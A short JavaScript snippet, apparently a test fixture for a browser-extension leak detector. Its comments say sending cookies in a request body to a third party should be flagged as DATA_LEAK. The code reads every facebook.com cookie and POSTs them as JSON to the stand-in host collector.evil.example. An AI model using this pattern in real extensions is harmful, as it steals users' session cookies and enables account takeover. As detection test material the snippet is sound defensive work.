// Same cookie, but this time POSTed in the request BODY to a third party.
// That IS exfiltration → DATA_LEAK (CHROME_COOKIES_INFO → FETCH_BODY), even
// though the header variant of the same data is suppressed as benign.
chrome.cookies.getAll({ domain: "facebook.com" }, (cookies) => {
  fetch("https://collector.evil.example/c", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(cookies),
  });
});
